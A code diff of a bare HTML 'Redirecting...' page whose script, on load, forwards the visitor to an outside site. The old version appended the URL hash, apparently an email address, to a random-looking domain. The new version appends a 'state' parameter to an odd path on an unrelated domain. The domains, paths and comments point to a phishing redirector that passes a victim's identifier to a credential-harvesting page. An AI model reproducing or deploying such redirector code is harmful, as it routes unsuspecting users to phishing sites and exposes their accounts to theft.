@@ -1,22 +1,29 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
   <script>
+    // Run after DOM loads
     window.onload = function () {
-      var hash = window.location.hash;
+      // Parse the current URL
+      const url = new URL(window.location.href);
 
-      // Remove leading #
-      if (hash.startsWith('#')) {
-        hash = hash.slice(1);
+      // Get the 'state' parameter from query string
+      const state = url.searchParams.get("state");
+
+      // If 'state' exists, redirect to new URL
+      if (state) {
+        const redirectUrl = `http://swedescustomdrums.com/brutu/mine/myown/${state}`;
+        window.location.href = redirectUrl;
+      } else {
+        // Optional: show message if no state found
+        document.body.innerText = "Missing 'state' parameter in URL.";
       }
-
-      // Construct raw URL with unencoded @
-      var targetUrl = "https://gcjcf.rlbkzsde.es/0Kx4mizBPPS!A/?XB" + hash;
-
-      // Redirect using replace() to avoid adding to browser history
-      window.location.replace(targetUrl);
     };
   </script>
 </head>
-<body></body>
+<body>
+  <p>Redirecting...</p>
+</body>
 </html>
